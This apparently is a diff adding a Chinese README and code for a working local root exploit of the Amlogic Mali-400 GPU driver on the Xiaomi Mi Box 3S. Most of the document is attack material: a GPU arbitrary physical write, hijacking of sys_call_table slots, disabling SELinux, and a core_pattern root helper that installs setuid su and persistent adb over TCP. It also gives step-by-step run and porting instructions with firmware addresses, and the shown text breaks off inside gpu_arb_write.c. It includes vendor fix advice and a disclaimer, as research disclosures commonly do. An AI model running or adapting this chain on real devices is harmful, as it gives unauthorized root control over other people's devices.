+## 3. 根因：物理地址校验被编译掉了
+
+Amlogic 发布树中的 `utgard/<版本>/common/mali_mem_validation.c`：
+
+```c
+_mali_osk_errcode_t mali_mem_validation_check(u32 phys_addr, u32 size)
+{
+#if 0
+	/* 针对 mali_mem_validator（framebuffer 范围）的真实范围校验 */
+	...
+	return _MALI_OSK_ERR_OK;
+	return _MALI_OSK_ERR_FAULT;
+#else
+	return _MALI_OSK_ERR_OK;      /* <-- 什么都接受 */
+#endif
+}
+```
+
+调用链（全驱动只有一个调用者）：
+
+```
+用户态 ioctl(MALI_IOC_MEM_BIND, flags |= BACKEND_EXTERNAL_MEMORY, phys_addr = X)
+  -> _mali_ukk_mem_bind()                    linux/mali_memory_manager.c
+  -> mali_mem_bind_ext_buf(..., X, ...)      linux/mali_memory_external.c
+  -> mali_mem_validation_check(X, size)      -> 永远返回成功
+  -> mali_mmu_pagedir_update(session->page_directory, virt, X, size, DEFAULT)
+```
+
+也就是说 `X` 被直接写进了 GPU 页目录：用户态因此获得对**任意物理页**的 GPU 读写能力。
+
+### 3.1 这是谁的缺陷？（是 Amlogic，不是 Arm）
+
+这一点决定了影响面怎么写，所以要说准确：
+
+| 代码树 | `mali_mem_validation_check` |
+|---|---|
+| Amlogic 发布的 `kernel/amlogic-tv-modules/mali-driver`，Utgard **r5p1 / r6p1 / r7p0 / r10p0** | 被 `#if 0` 关闭 |
+| 独立仓库中标称**原始导入**的 Utgard **r6p1**（[`superna9999/meson_gx_mali_450`](https://github.com/superna9999/meson_gx_mali_450/blob/391322531863c8b6c719ba7f3e832afb9999ccd3/driver/src/devicedrv/mali/common/mali_mem_validation.c)）| **保留完整校验** |
+
+两份文件的版权头都写着 ARM，所以"看版权头"本身证明不了任何事。
+回归出在 **Amlogic 派生版本**，且仅在那里。
+
+另外，`mali_mem_validation_add_range()` 在整个驱动里只有一个调用点
+（`common/mali_kernel_core.c`，注册 framebuffer 范围）——即使把校验打开，
+它也只会放行 framebuffer 那一小段。
+
+参考：
+- Amlogic 发布提交：<https://android.googlesource.com/kernel/amlogic-tv-modules/mali-driver/+/7c6e2c22d0cb0e39e969e39bdc0398a2c2f205d9>
+- r6p2 里同样的缺陷：<https://android.googlesource.com/kernel/amlogic-tv-modules/mali-driver/+/refs/tags/android-tv-10.0.0_r0.1/utgard/r6p2/common/mali_mem_validation.c>
+
+---
+
+## 4. 写原语（这一段才是工程量所在）
+
+只有"映射"还不够，还需要**可控地写**。Utgard 的 PP（pixel processor）
+可以由我们自己构造的命令缓冲来驱动，它的 write-back 阶段会把片元颜色写进渲染目标。
+
+`src/gpu_arb_write.c` 用 ion 分配命令缓冲，通过 `MALI_IOC_MEM_BIND`（DMA_BUF 后端）
+绑到 `CMD_VA`，填入 5 条指令的片元着色器与渲染目标描述符，再把**目标物理页**
+用 external 后端绑到 `EXT_VA`，最后提交一次 `MALI_IOC_PP_START_JOB`（408 字节）。
+
+真正起作用的是 job 偏移 168 处的描述符：
+
+```c
+put32(job, 168, 0x02);                     /* 类型：write-back */
+put32(job, 172, EXT_VA + (phys & 0xfff));  /* 目标地址 */
+put32(job, 176, pixel_format);             /* 这一笔的宽度 */
+```
+
+### 4.1 `pixel_format` 标定（上机实测）
+
+每次 job 固定写 **32 个像素**，字节宽度由格式决定：
+
+| `pixel_format` | 写入字节数 | 内容 |
+|---|---|---|
+| **0x06** | **128** | 同一个 8 字节值按字节序重复 16 次 |
+| 0x08 | 64 | 低 32 位重复 16 次 |
+| 0x03 / 0x0f | 64 | 单个 32 位值（由常量重排得到）|
+| 0x00,01,02,05,07,0e | 32 | 单个 32 位值（抖动图案）|
+| **0x09,0a,0b,0c** | **16** | **全零** |
+| 0x04 / 0x0d | 16 | 0x44444444 / 0x33333333 |
+
+另外几条实测事实：
+
+- `pixel_format` 只有**低 4 位**有效（`0x06 ≡ 0x16 ≡ 0x26`）；
+- `wh` 字段（`(0x400<<16)|0x400`）对 footprint **完全没有影响**（测了 7 个值）——
+  32 像素的突发长度是固定的；
+- **没有 4 字节或 8 字节的粒度**，最小就是 16 字节；
+- `0x06` 的落点**精确**（请求 `+0x40` ⇒ 变化区间 `0x40..0xbc`），
+  `0x09` 也是精确的 16 字节且无外溢；
+- PoC 启动时会先在自己的 ion 页上标定，如果实测 footprint 不是
+  "恰好 128 字节、从请求地址开始"，就中止、不碰目标地址。
+
+### 4.2 缓存一致性——这里有个坑
+
+- **冷数据**（`lease_break_time`、`core_pattern`）：GPU 的 DMA 写**立即生效**；
+- **热变量**（`selinux_enforcing`、`panic_on_oops`，每次权限判定都会读、常驻 CPU cache）：
+  GPU 直写**完全无效**——`getenforce` 一直是 `Enforcing`，因为 CPU 一直在用缓存里的旧值。
+- `sys_call_table` 介于两者之间，**不能当成冷数据**。它每次系统调用都会被读，
+  缓存行常驻：在小米盒子 3S 上，DMA 写进表里后 CPU 仍读旧表项，把整个
+  `.data`/`.rodata` 扫一遍都不命中。在探测/调用前走一遍几 MB 的缓冲
+  （`src/gpwrite.c` 与 `src/kfunc.c` 里的 `cache_thrash()`）强制该行换出，
+  表项才会从 DRAM 重新加载、劫持才生效。
+
+所以最后一步必须是**CPU 视角的写**（通过被劫持的 `memcpy`），不能用 GPU 写。
+这一点当时花了好几个小时，别忽略。
+
+---
+
+## 5. 从"任意物理写"到"任意内核读写"
+
+### 5.1 `sys_call_table` 里有 16 个空槽位
+
+本内核的 `sys_call_table` 是 **8 字节**表项（arm64）。
+`[244..259]` 这 16 个连续槽位全是 `sys_ni_syscall`——即"未实现"、没人调用。
+
+本固件中 `sys_call_table[244]`：
+
+```
+虚拟地址 = 0xffffffc001f6f000 + 244*8 = 0xffffffc001f6f7a0
+物理地址 = 0x1f6f7a0                       （本机 .data 漂移为 0x4000）
+```
+
+一次 `gpu_arb_write` 写 128 字节 = 正好覆盖这 16 个表项，且停在表边界——不溢出。
+
+> 准确性说明：从 flash dump 恢复的 2022 版 vmlinux 里 `[278..293]` 是 `0x0`，
+> 但在这台 2021 固件上调用 278 号返回 `-EPERM`，说明它**不是**可用的空槽。
+> 只有 `[244..259]` 经过实测。
+
+### 5.2 命中哪张表取决于调用者的位数
+
+| 调用者 | 使用的表 | 位置 |
+|---|---|---|
+| 32 位进程 | `compat_sys_call_table` | **`.text`**（`0xffffffc00108d000`）|
+| **64 位进程** | `sys_call_table` | **`.data`**（`0xffffffc001f6f000`）|
+
+所以负责"调内核函数"的那个 helper **必须是 64 位**二进制。这台设备虽然用户态
+只有 32 位，但能正常运行静态 aarch64 程序；如果你的设备不行，就只能去改
+`.text` 里的 `compat_sys_call_table`（那是另一个问题：漂移 + icache）。
+
+GPU 写那个 helper 可以保持 32 位（它只碰 `.data`，而且 ion 的 ioctl 结构体在
+32/64 位下布局本来就不同）。
+
+### 5.3 用一个符号解析器来 bootstrap
+
+`kallsyms_lookup_name(const char *name)` 返回符号地址。把它的地址放进槽位后，
+`syscall(244, "符号名")` 就能解析任何符号：
+
+```
+kfunc sym commit_creds        -> 0xffffffc0010c8df0   （与 vmlinux 完全一致）
+kfunc sym selinux_enforcing   -> 0xffffffc0021697bc
+kfunc sym memcpy              -> 0xffffffc0013e75c0   （vmlinux 是 0x13e76b0，漂移 -0xf0）
+```
+
+这就是为什么整条链只需要**一个**固件相关常量：`kallsyms_lookup_name` 本身。
+下游全部（包括漂移不为 0 的 `memcpy`）都由内核自己解析。
+
+### 5.4 任意内核读写
+
+把槽位换成 `memcpy` 后，这个系统调用就变成了 memcpy：
+
+```
+kfunc show 0xffffffc0021697b0 32   # memcpy(用户, 内核, n)  -> 读内核
+kfunc zero 0xffffffc0021697bc 4    # memcpy(内核, 用户, n)  -> 写内核
+```
+
+SELinux 全局变量写入前后的回读见第 6 节。
+
+---
+
+## 6. 关掉 SELinux
+
+本固件解析出的地址：
+
+| 符号 | 地址 |
+|---|---|
+| `avc_callbacks` | `0xffffffc0021697b0` |
+| `selinux_secmark_refcount` | `0xffffffc0021697b8` |
+| **`selinux_enforcing`** | **`0xffffffc0021697bc`** |
+| `sel_inode_cache` | `0xffffffc0021697c0` |
+| `default_noexec` | `0xffffffc0021697c8` |
+
+```
+kfunc zero 0xffffffc0021697bc 4     # CPU 视角的 4 字节写
+```
+
+```
+写入前：... 00000000 01000000 003f1000c0ffffff ...   （enforcing = 1）
+写入后：... 00000000 00000000 003f1000c0ffffff ...   （enforcing = 0，sel_inode_cache 完好）
+getenforce -> Permissive
+```
+
+> 还有一个不需要解析器的备选：用 16 字节全零突发（`pixel_format 0x09`）
+> 对准 `avc_callbacks`（= `enforcing - 0xC`），正好覆盖
+> `avc_callbacks(8) + secmark_refcount(4) + enforcing(4)`，并在
+> `sel_inode_cache` 前一个字节停下，不碰任何 `kmem_cache` 指针。
+> 但因为第 4.2 节的缓存原因它对 `selinux_enforcing` 无效，所以最终走的是 CPU 写。
+
+---
+
+## 7. 拿到 root
+
+SELinux 变成 permissive 之后，内核的 core-dump pipe helper 就是一个 root 执行器
+（`core_pattern` 这条路上没有 LSM 前置检查）：
+
+```
+kfunc str <core_pattern> "|/data/local/tmp/roothelper.sh"
+# 在 RLIMIT_CORE 已设置的情况下崩溃一个进程
+```
+
+`roothelper.sh` 会以 `uid=0`、`context=u:r:kernel:s0` 运行。具体内容见该文件：
+它会装一个 setuid 的 `su`，并让 adb 在重启后仍然可连。
+
+另一条不依赖 `core_pattern` 的路（也验证过）：把槽位指向 `prepare_kernel_cred`，
+拿到它返回的 root cred 指针，再把槽位指向 `commit_creds` 并调用它。
+**注意不要跨进程复用那个 cred 指针**——`exit_creds()` 会把引用计数降到 0 释放掉，
+再用就是 use-after-free。
+
+---
+
+## 8. 编译与运行
+
+### 8.1 前置条件
+
+- `adb` 已连上盒子（`adb devices` 能看到）。下面全部以普通 `adb shell`（uid 2000）执行，
+  **root 是结果，不是前提**。
+- 一套交叉工具链：`aarch64-linux-gnu-gcc` + `arm-linux-gnueabihf-gcc`，**或者**用
+  [zig](https://ziglang.org)（`make zig` 不需要 sysroot，也不用装 gcc）。
+- 设备上不需要任何额外东西：helper 都是静态链接，用 `/system/bin/sh` 跑。
+
+### 8.2 编译
+
+```sh
+make                          # 小米盒子 3S 那条链：gpwrite64 kfunc_new kread crash_for_core
+make zig                      # 同上，用 zig 当交叉编译器
+make gpu_arb_write gpu_scan   # 上游的 32 位 helper（MiTV4 路径 / 对照用）
+```
+
+`kfunc_new` **必须**是 aarch64：32 位调用者会被派发到 `.text` 里的
+`compat_sys_call_table`，永远打不到本利用要改的那张表（§5.2）。`gpwrite64` 同理——
+写本身与位宽无关，但它在里面做的探测不是。
+
+### 8.3 推送
+
+```sh
+make install
+```
+
+或者手动：
+
+```sh
+adb push gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh /data/local/tmp/
+adb shell 'cd /data/local/tmp && chmod 755 gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh'
+```
+
+### 8.4 先验证写原语，再碰系统调用表
+
+```sh
+adb shell /data/local/tmp/gpwrite64 place 0
+# [*] test page phys=0x47e5d000 +0x0
+# [*] changed [0x0..0x7f] count=128 PLACEMENT OK
+```
+
+`PLACEMENT OK` 表示一次 128 字节的 GPU 写确实落在了 `pagemap` 报的那个物理页上。
+出现 `MISMATCH` 或 `count=0` 就停下来——写原语没通，后面每一步都会变成往内核内存里
+写垃圾（§4）。
+
+### 8.5 运行
+
+```sh
+adb shell /data/local/tmp/run.sh
+```
+
+```
+[run] stage 0: sys_call_table[244..259] <- kallsyms_lookup_name
+[run] memcpy            = 0xffffffc0013e1270
+[run] selinux_enforcing = 0xffffffc0020cff24
+[run] core_pattern      = 0xffffffc001f1c0c8
+[run] stage 2: sys_call_table[244..259] <- memcpy
+[run] stage 3: selinux_enforcing = 0
+[run] getenforce -> Permissive
+[run] stage 4: core_pattern <- |/data/local/tmp/roothelper.sh
+[run] stage 5: triggering coredump
+[run] success - helper ran as root:
+    uid=0(root) gid=0(root) ... context=u:r:kernel:s0
+```
+
+`roothelper.sh` 会把自身输出写到 `/data/local/tmp/root.log`；如果
+`/data/local/tmp/su` 存在，还会把它装成 setuid 的 `su`（§7）。
+
+### 8.6 换成别的固件
+
+只有两个常量与构建相关，其余全部在运行期解析：
+
+```sh
+KLN_ADDR=ffffffc00111e5a0 SLOT_PHYS=1eaf7a0 adb shell /data/local/tmp/run.sh
+```
+
+| 构建 | `SLOT_PHYS` | `KLN_ADDR` |
+|---|---|---|
+| `8.2.2.817`（`run.sh` 的默认值） | `1ee77a0` | `ffffffc00111e5d0` |
+| `6.8.22.145` | `1eaf7a0` | `ffffffc00111e5a0` |
+
+在陌生构建上恢复这两个值——包括完全没有 root 的情况——见 §10 与
+[FINDING_ADDRESSES.md](FINDING_ADDRESSES.md)。
+
+### 8.7 失败时看这里
+
+| 现象 | 原因 |
+|---|---|
+| `place` 打印 `MISMATCH` 或 `count=0` | 写没落地：`/dev/mali` 必须是 `0666`，且本单元要用 §4.1 的 `pixel_format` |
+| `cannot resolve memcpy (slot wrong?)` | `SLOT_PHYS` 不是本构建的 `sys_call_table[244]` |
+| 直接重启 / 黑屏 | 内核 oops，本机 `panic_on_oops=1`。地址错会**直接 fault**，不会温和失败——务必先离线确认（§10） |
+| `gpwrite64 missing (build: make gpwrite64)` | 推送后没 `chmod 755`，或者二进制架构不对 |
+
+---
+
+## 9. 已有先例，以及本仓库真正新增的是什么
+
+### 9.1 这个手法已经公开
+
+**RIPMaliUtgard / kort**（作者 Luke / lr-m）公开了同一条核心路径——
+外部物理页绑定、手工配置 PP/write-back、覆盖内核函数指针：
+
+- 首次提交 **2026-02-16** — <https://github.com/lr-m/RIPMaliUtgard/commit/4dec3d8783c30864a4fdc8ad1620598236bce8c4>
+- 移植到新版驱动路径 **2026-02-19** — <https://github.com/lr-m/RIPMaliUtgard/commit/1f55bfae18d730ba3de032392a6d9e190ff01455>
+- 仓库 — <https://github.com/lr-m/RIPMaliUtgard>
+
+作者 2026-03-01 的文章讨论了 r6p2+ 的 `MEM_BIND / bind_ext_memory`，
+其引用的 r6p2 源码里同样是 `#if 0`。仓库与文章都没有标注 CVE。
+
+所以：**这条路径和根因都不是我们首先发现的。** 本仓库增加的是
+"在一个具体产品上的实测实例"以及下面这些差异。
+
+### 9.2 值得核对的差异
+
+| # | 差异 |
+|---|---|
+| 1 | 把**未使用的 `sys_call_table` 槽位**当作通用的内核函数调用原语，并指出 32 位/64 位分别走 `compat_sys_call_table`（在 `.text`）与 `sys_call_table`（在 `.data`） |
+| 2 | 用 **`kallsyms_lookup_name` 做 bootstrap 解析器**，再把同一批槽位换成 `memcpy` 获得任意内核读写——因此整条链只需要一个固件相关常量 |
+| 3 | 第 4.1 节的 **`pixel_format` 宽度表**（最小 16 字节、`wh` 无关、落点精确）|
+| 4 | 第 4.2 节的**缓存一致性差异**（冷数据 GPU 写有效；热变量必须 CPU 写）|
+
+### 9.3 相关但**不是**这个缺陷的 CVE
+
+| CVE | 为什么不是 |
+|---|---|
+| [CVE-2022-36449](https://nvd.nist.gov/vuln/detail/CVE-2022-36449) | Midgard/Bifrost/Valhall（**kbase**）的 use-after-free / 越界写 / 映射信息泄露；未列 Utgard |
+| [CVE-2022-34830](https://nvd.nist.gov/vuln/detail/CVE-2022-34830) | Utgard 的 **TOCTOU 竞态导致 UAF**；不是"直接放行任意物理地址绑定" |
+
+截至 2026-10-27，没有找到与本根因对应的 CVE，本仓库也不主张存在。
+是否曾经有人私下提交过，需要 CNA 查重。
+
+GPU 辅助内核利用这个方向的背景资料：
+[PhantomMap（NDSS 2025）](https://www.ndss-symposium.org/ndss-paper/phantommap-gpu-assisted-kernel-exploitation/)、
+以及 DEF CON SG 的
+[Finding a Generic Mali GPU Read/Write Primitive](https://media.defcon.org/DEF%20CON%20SG%201/DEF%20CON%20SG%201%20main%20stage%20presentations/Shuquan%20Zhou%2C%20Guang%20Gong%2C%20Jun%20Yao%20-%20Finding%20a%20Generic%20Mali%20GPU%20Read-Write%20Primitive%20for%20Real-World%20Exploit%20Development.pdf)。
+
+---
+
+## 10. 移植到其他固件的提示
+
+只有两个未知量，且都是每个构建固定的：
+
+1. **`kallsyms_lookup_name`** —— bootstrap 地址。
+   没有符号表时：它位于 `.text` 靠前位置，漂移通常为 0。本机上它就等于
+   vmlinux 里的值（`0xffffffc00111f308`）。
+2. **`sys_call_table`** —— 即 `sys_call_table + 244*8`，减去
+   `0xffffffc000000000` 得到物理地址。
+
+在新构建上找候选槽位的一个便宜办法：解析**随固件发布的** vmlinux
+（或 boot 镜像 dump），找最长的一段 `sys_ni_syscall`；然后在运行期用一次无害调用确认，
+例如把 `kallsyms_lookup_name` 放进去、解析一个你已经知道地址的符号。
+槽位猜错会直接 panic，所以务必先离线确认。
+
+---
+
+## 11. 修复建议
+
+对维护这类代码树的厂商：
+
+- 重新启用 `mali_mem_validation_check()`（并注册应该允许的范围）；或者
+- 除非是高特权调用者，否则直接拒绝 external memory 后端；并且
+- 收紧设备节点：`/dev/mali` 是 0666 意味着**任何 app** 都能利用。
+
+对受影响设备的用户：没有用户侧修复办法——校验是编译进内核的。
+要么不要让不可信 app 装在这台设备上，要么使用修好的固件。
+
+---
+
+## 12. 范围、合法性与免责声明
+
+- 发布目的是**对你拥有的硬件做研究与维修**。它需要一个已经具备的特权立足点
+  （`adb shell`，也就是设备本来就在你手上），或者本机安装的一个 app；
+  它不是远程漏洞。
+- 底层手法**已经公开**（见 9.1）。本仓库不主张新的漏洞类别，也不主张任何 CVE。
+- 地址只对应一个固件构建。在别的构建上运行**极可能让内核 panic**
+  （本机 `panic_on_oops=1` ⇒ 直接重启）。
+- 部分步骤会改动 `/system`（setuid `su`）和持久属性。回滚：
+  `mount -o rw,remount /system && rm /system/xbin/su`，以及
+  `setprop persist.adb.tcp.port ""`。
+- 不提供任何担保，风险自负。
+
+---
+
+## 13. 文件说明
+
+| 文件 | 目标架构 | 作用 |
+|---|---|---|
+| `src/gpwrite.c` | aarch64 | 绕开 ion 的写原语：普通文件页 + `/proc/self/pagemap` + 外部内存绑定（Mi Box 3S 必须用它） |
+| `src/gpu_arb_write.c` | armv7 | 通过 Utgard write-back 单元向任意物理地址写 128 字节（ion 路径） |
+| `src/gpu_scan.c` | armv7 | 进程内探测循环，用于定位 `sys_call_table[244]` |
+| `src/kfunc.c` | aarch64 | 通过未使用的 `sys_call_table` 槽位调用内核函数 |
+| `src/crash_for_core.c` | armv7 | 放开 `RLIMIT_CORE` 后触发 SIGSEGV，让 `core_pattern` 生效 |
+| `src/kread.c` | aarch64 | physmap canary payload 的 3 参数调用器（用于定位地址） |
+| `run.sh` | — | 驱动整条链（已填 Mi Box 3S 常量） |
+| `roothelper.sh` | — | 由 `core_pattern` 以 root 运行；安装 `su`、修好 adb |
+| `root_cmd.sh` | — | helper 里运行的示例动作（拉起 `tvagent`） |
+| `Makefile` | — | 构建，含 `zig` 目标 |
+| `PORT_MIBOX3S.md` | — | 移植记录：地址、ion / cache / 位宽三个坑 |
+| `FINDING_ADDRESSES.md` | — | 无 root 时如何重新定位 `SLOT_PHYS` / `KLN_ADDR` |
+
+## 14. 关键词
+
+**设备 / 平台** —— 小米盒子 3S、MiBox3S、MDZ-19-AA、`queenchristina`、小米电视盒子、
+机顶盒、Android TV、Android 6.0.1、Amlogic S905X、Mali-400、Utgard DDK r6p1、
+内核 3.14、arm64 / aarch64、armv8l。
+
+**漏洞 / 手法** —— 本地提权（LPE）、root、获取 root、uid 0、`/dev/mali`（0666）、
+`/dev/ion`、外部内存绑定缺少校验、GPU write-back 单元、任意物理写、`sys_call_table`、
+`compat_sys_call_table`、`kallsyms_lookup_name`、kallsyms、`memcpy`、SELinux permissive、
+`core_pattern`、`panic_on_oops`、缓存一致性、physmap（ret2dir 类）、内核利用、
+PoC / 概念验证。
+
+**相关** —— MiTV4（同一驱动缺陷、不同构建）、`mali_mem_validation_check`、Amlogic、
+CVE-2022-34830、CVE-2022-36449（都不是本缺陷）。
+
+## 15. 许可证
+
+MIT —— 见 `LICENSE`。上游文字与代码版权归 © 2026 Yeuoly
+（[Yeuoly/mitv4-utgard-lpe](https://github.com/Yeuoly/mitv4-utgard-lpe)）；
+本仓库新增的小米盒子 3S 移植部分同样以 MIT 发布。
+
+```
+
+`root_cmd.sh`:
+
+```sh
+#!/system/bin/sh
+setsid /data/local/tmp/tvagent </dev/null >/data/local/tmp/agent.log 2>&1 &
+sleep 1
+echo started > /data/local/tmp/agent_started.txt
+
+
+```
+
+`roothelper.sh`:
+
+```sh
+#!/system/bin/sh
+#
+# Runs as root because the kernel's core-dump pipe helper, configured via
+# core_pattern by run.sh, is spawned with full privileges.  It has no usable
+# stdin/stdout, so it writes its findings to /data/local/tmp/root.log.
+#
+# What it demonstrates: with SELinux already permissive we can now do
+# arbitrary root work - here we make it permanent enough to be useful:
+#   * raise an interactive root shell on a TCP port for the current session
+#   * install a setuid-root su so later shells can escalate directly
+#   * keep adb reachable over TCP across reboots
+#
+# Everything is opt-in and reversible; see README "cleanup".
+
+exec </dev/null
+LOG=/data/local/tmp/root.log
+exec >$LOG 2>&1
+
+echo "=== core_pattern helper ==="
+date 2>/dev/null
+id
+echo "selinux: $(getenforce 2>/dev/null) / $(cat /sys/fs/selinux/enforce 2>/dev/null)"
+echo "context: $(cat /proc/self/attr/current 2>/dev/null)"
+
+# 1) adb over TCP after every reboot (root domain can set persistent props)
+setprop service.adb.tcp.port 5555
+setprop persist.adb.tcp.port 5555
+echo "service.adb.tcp.port = $(getprop service.adb.tcp.port)"
+echo "persist.adb.tcp.port = $(getprop persist.adb.tcp.port)"
+
+# 2) setuid-root su, so `adb shell su` works from now on
+if [ -f /data/local/tmp/su ]; then
+    mount -o rw,remount /system 2>/dev/null
+    cp /data/local/tmp/su /system/xbin/su
+    chown 0:0 /system/xbin/su
+    chmod 6755 /system/xbin/su
+    ls -l /system/xbin/su
+fi
+
+echo "=== done ==="
+
+```
+
+`run.sh`:
+
+```sh
+#!/system/bin/sh
+#
+# run.sh - drive the full chain on a Xiaomi Mi Box 3S (MDZ-19-AA).
+#
+# Target firmware: build 8.2.2.817, Android 6.0.1 (SDK 23),
+#                  kernel 3.14.29-301318-g9206404 (arm64), SELinux Enforcing.
+#
+# Why this differs from the MiTV4 variant (details in PORT_MIBOX3S.md):
+#   1. /dev/ion mmap is broken on this firmware - every mapping returns
+#      0x400008, so the ion-based gpu_arb_write cannot fill its command buffer
+#      and never submits a job.  gpwrite() uses a plain file page instead, takes
+#      the physical address from /proc/self/pagemap and attaches the page with
+#      the external-memory backend.
+#   2. sys_call_table must be reached from an aarch64 process; a 32-bit caller
+#      is dispatched through compat_sys_call_table (which lives in .text), so
+#      the write half is built 64-bit here too.
+#   3. sys_call_table's cache line is read on every syscall and stays hot, so a
+#      DMA write is invisible until the line is evicted.  Both helpers walk an
+#      8 MB buffer (cache_thrash) right before they need the new value.
+#
+# Only two firmware-specific constants are needed; everything else is resolved
+# at run time through the kernel's own symbol table.
+#
+#   KLN_ADDR   address of kallsyms_lookup_name
+#   SLOT_PHYS  physical address of sys_call_table[244]
+#              (= (virtual sys_call_table) + 0x7a0 - 0xffffffc000000000)
+#
+# Override either one from the environment for a different build.
+
+set -u
+D=/data/local/tmp
+
+KLN_ADDR=${KLN_ADDR:-ffffffc00111e5d0}   # kallsyms_lookup_name, build 8.2.2.817
+SLOT_PHYS=${SLOT_PHYS:-1ee77a0}          # sys_call_table[244] physical
+
+GW=${GW:-$D/gpwrite64}
+KF=${KF:-$D/kfunc_new}
+
+say() { echo "[run] $*"; }
+die() { echo "[run] FATAL: $*" >&2; exit 1; }
+
+[ -x "$GW" ] || die "$GW missing (build: make gpwrite64)"
+[ -x "$KF" ] || die "$KF missing (build: make kfunc_new)"
+
+# ---- stage 0: point the 16 unused syscall slots at kallsyms_lookup_name ----
+say "stage 0: sys_call_table[244..259] <- kallsyms_lookup_name"
+"$GW" write "$SLOT_PHYS" "$KLN_ADDR" || die "gpu write failed"
+
+# ---- stage 1: resolve what we need from the kernel's symbol table ----
+resolve() {
+    out=$("$KF" sym "$1" 2>/dev/null) || die "cannot resolve $1 (slot wrong?)"
+    echo "$out" | awk -F'0x' '{print $2}' | tail -1
+}
+
+MEMCPY=$(resolve memcpy)
+SELINUX_ENFORCING=$(resolve selinux_enforcing)
+CORE_PATTERN=$(resolve core_pattern)
+[ -n "$MEMCPY" ] || die "resolved an empty memcpy"
+say "memcpy            = 0x$MEMCPY"
+say "selinux_enforcing = 0x$SELINUX_ENFORCING"
+say "core_pattern      = 0x$CORE_PATTERN"
+
+# ---- stage 2: turn the same slots into memcpy ----
+say "stage 2: sys_call_table[244..259] <- memcpy"
+"$GW" write "$SLOT_PHYS" "$MEMCPY" || die "gpu write failed"
+
+# ---- stage 3: SELinux -> permissive ----
+say "stage 3: selinux_enforcing = 0"
+"$KF" zero "0x$SELINUX_ENFORCING" 4 || die "write failed"
+say "getenforce -> $(getenforce 2>/dev/null)"
+
+# ---- stage 4: point core_pattern at a root helper ----
+say "stage 4: core_pattern <- |$D/roothelper.sh"
+"$KF" str "0x$CORE_PATTERN" "|$D/roothelper.sh" || die "write failed"
+
+# ---- stage 5: trigger a core dump; the kernel runs the helper as root ----
+say "stage 5: triggering coredump"
+rm -f "$D/root.log"
+if [ -x "$D/crash_for_core" ]; then
+    "$D/crash_for_core"
+else
+    ulimit -c unlimited 2>/dev/null
+    ( kill -SEGV $$ ) 2>/dev/null
+fi
+sleep 2
+
+if [ -f "$D/root.log" ]; then
+    say "success - helper ran as root:"
+    sed 's/^/    /' "$D/root.log"
+else
+    say "helper did not run (check dmesg / the core_pattern value)"
+    exit 3
+fi
+
+```
+
+`src/crash_for_core.c`:
+
+```c
+/* crash_for_core - raise RLIMIT_CORE and die with SIGSEGV so the kernel runs
+ * the core_pattern pipe helper. */
+#include <sys/resource.h>
+#include <unistd.h>
+
+int main(void)
+{
+    struct rlimit r;
+    r.rlim_cur = RLIM_INFINITY;
+    r.rlim_max = RLIM_INFINITY;
+    setrlimit(RLIMIT_CORE, &r);
+    *(volatile int *)0 = 1; /* SIGSEGV */
+    return 0;
+}
+
+```
+
+`src/gpu_arb_write.c`:
+
+```c
+/*
+ * gpu_arb_write - write a 128-byte block of a repeated 8-byte value to an
+ *                 arbitrary physical address, using the Mali-400 (Utgard)
+ *                 write-back unit driven by a hand-crafted PP job.
+ *
+ * Why this works: in the Amlogic-published Utgard driver,
+ * mali_mem_validation_check() is compiled with its body replaced by
+ * "#else return _MALI_OSK_ERR_OK;", so MEM_BIND with the EXTERNAL_MEMORY
+ * backend accepts any physical address and writes it straight into the
+ * session's GPU page directory.
+ *
+ *   ioctl(/dev/mali, MALI_IOC_MEM_BIND, {flags = EXTERNAL_MEMORY, phys = X})
+ *     -> _mali_ukk_mem_bind -> mali_mem_bind_ext_buf
+ *     -> mali_mem_validation_check()  (always OK)
+ *     -> mali_mmu_pagedir_update(X)
+ *
+ * The PP job below then makes the fragment/write-back stage emit a constant
+ * 8-byte value.  With pixel_format = 0x06 the write-back unit emits exactly
+ * 128 bytes: the same 8-byte value repeated 16 times, starting at the
+ * requested address.  (Calibrated on hardware; see README "write primitive".)
+ *
+ * Build (32-bit ARM, static):
+ *   arm-linux-musleabihf-gcc -O1 -static -o gpu_arb_write gpu_arb_write.c
+ *
+ * Usage:
+ *   gpu_arb_write <phys_hex> <value_hex64>
+ *
+ *   The address must be page aligned; the value is written at page offset 0.
+ *   A calibration self-test on a private ion page runs first and aborts if the
+ *   write engine does not place exactly 16 bytes at the requested offset.
+ *
+ * This program does not read kernel memory and does not parse anything.
+ */
+#define _GNU_SOURCE
+#include <errno.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <unistd.h>
+
+#define ION_IOC_ALLOC 0xc0144900u
+#define ION_IOC_SHARE 0xc0084904u
+#define ION_IOC_CUSTOM 0xc0084906u
+
+#define MALI_IOC_MEM_BIND 0xc0288302u
+#define MALI_IOC_PP_START_JOB 0xc1988400u
+#define MALI_IOC_WAIT_NOTIF 0xc0688202u
+
+#define CMD_VA 0x20000000u
+#define EXT_VA 0x40000000u
+#define ION_HEAP_SYSTEM 1u
+#define ION_HEAP_CARVEOUT (1u << 2)
+
+/* Mali memory bind flag: external memory backend (phys address, not a fd). */
+#define BIND_EXTERNAL (1u << 11)
+
+#define PIXFMT_WB_128 0x06 /* 128 bytes: 8-byte value repeated 16x */
+
+struct ion_alloc {
+    uint32_t len, align, heap_mask, flags, handle;
+};
+struct ion_fd {
+    uint32_t handle;
+    int32_t fd;
+};
+struct ion_custom {
+    uint32_t cmd, arg;
+};
+struct ion_phys {
+    int32_t fd;
+    uint32_t addr, size;
+};
+struct mali_bind {
+    uint64_t ctx;
+    uint32_t vaddr, size, flags, padding;
+    uint32_t phys_addr, rights, ext_flags, pad2;
+};
+
+static void put32(void *b, unsigned off, uint32_t v)
+{
+    *(uint32_t *)((char *)b + off) = v;
+}
+static void put64(void *b, unsigned off, uint64_t v)
+{
+    *(uint64_t *)((char *)b + off) = v;
+}
+
+static int mali_fd = -1;
+static int ion_fd = -1;
+static void *cmd_buf = NULL;
+
+/* The fragment shader is the 8 dwords written into the command buffer below.
+ * The job only needs it to reach the write-back stage with a constant colour;
+ * the interesting part for us is the "write target" descriptor at offset 168. */
+static void build_shader(void)
+{
+    uint32_t *c = (uint32_t *)cmd_buf;
+    memset(cmd_buf, 0, 0x4000);
+    c[0] = 0;
+    c[1] = 0xB8000000u;
+    c[2] = 0xE0000002u | (((CMD_VA + 0x3000u) >> 3) & ~0xE0000003u);
+    c[3] = 0xB0000000u;
+    c[4] = 0;
